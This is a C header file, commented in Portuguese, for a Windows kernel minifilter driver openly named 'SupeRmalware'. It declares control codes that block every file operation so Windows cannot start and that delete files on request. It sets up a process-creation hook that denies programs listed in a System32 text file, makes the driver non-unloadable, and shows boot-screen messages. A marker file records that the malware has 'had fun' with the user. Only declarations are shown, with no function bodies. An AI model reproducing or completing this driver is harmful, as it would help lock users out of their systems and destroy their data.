
/*

	Arquivo de cabeçalho, todas as váriaveis e funções estarão aqui

*/

///
/// Arquivos necessários para o funcionamento do driver
///
#include <fltKernel.h>
#include "screen.h"
#include "process.h"

// Bloquea TODAS as operações de arquivos, impedindo que o Windows inicie, ou faça qualquer coisa
#define BLOQUEAR_TUDO CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1000, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Avisa que o user-mode quer deletar um arquivo
#define DELETAR_ARQUIVO CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2000, METHOD_BUFFERED, FILE_ANY_ACCESS)
BOOLEAN DenyAll = FALSE;

// Tamanho máximo do buffer, que será chamada na função DenyProcess
#define BUFFER_SIZE 500

// Nome dos dispositivos para a comunicação com o user-mode
UNICODE_STRING DevName = RTL_CONSTANT_STRING(L"\\Device\\SupeRmalware"), SysLinkName = RTL_CONSTANT_STRING(L"\\??\\SupeRmalware");

// Filtro do minifiltro, para interceptar as operações em arquivos
PFLT_FILTER MinifilterFilter;

// Dispositivo global, ele vai guardar as informações (nome do dispositivo e etc) para que a comunicação funcione
PDEVICE_OBJECT GlobalDevice;

// Quando evento de arquivo é chamado
FLT_PREOP_CALLBACK_STATUS CreateIrpBefore( PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS Objects, PVOID* Context);

// Chamadas
const FLT_OPERATION_REGISTRATION Callbacks[] =
{
	{IRP_MJ_CREATE, 0, CreateIrpBefore, NULL},
	{IRP_MJ_OPERATION_END} 
};

// Configurações de registro
const FLT_REGISTRATION Registration = {
	sizeof(FLT_REGISTRATION),
	FLT_REGISTRATION_VERSION,
	0,
	NULL,
	Callbacks,	// Chamadas
	NULL,		// Função que descarrega o Driver, se ele está NULL, não poderá ser descarregado
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};

// Quando um IRP é criado, é necessário criar um para receber os outros
NTSTATUS MessageCreated(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// Quando um IRP é enviado, nele, contém as informações que o user-mode informou
NTSTATUS MessageReceived(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// Quando o IRP é fechado, é necessário fechar ele para permitir outra mensagem depois
NTSTATUS MessageClosed(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// Arquivo que indicia que o malware já se divertiu o bastante com o usuário
UNICODE_STRING Funny = RTL_CONSTANT_STRING(L"\\??\\C:\\Windows\\hahahalol");

// Arquivo que verifica quais processos devem ser bloqueados
UNICODE_STRING FileDeny = RTL_CONSTANT_STRING(L"\\??\\C:\\Windows\\System32\\deny.txt");

// Inicia o Driver
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath);

// Função que é chamada sempre que um processo é executado
VOID NewProcess(_In_ PEPROCESS Process, _In_ HANDLE Pid, PPS_CREATE_NOTIFY_INFO Info);

// Verifica se um arquivo existe
BOOLEAN FileExists(_In_ UNICODE_STRING FileName);

// Delete um arquivo
VOID DeleteFile(_In_ UNICODE_STRING FileName);

// Mostra uma mensagem na tela de boot
VOID ShowMessageOnScreen(_In_ PCHAR Message);

// Verifica se um processo deve ser negado
BOOLEAN DenyProcess(_In_ PCHAR ProcessName);

// Obtém o nome completo do processo
PUNICODE_STRING GetFullProcessName(_In_ PEPROCESS Process);

// Essa função serve para pegar o nome de um processo (mas não o caminho completo)
const char* PsGetProcessImageFileName(PEPROCESS Process);

// Filtro
PFLT_FILTER Filter;

FLT_PREOP_CALLBACK_STATUS;

// Converte uma UNICODE para CHAR
BOOLEAN UnicodeStringToChar(PUNICODE_STRING Unicode, char Char[]);
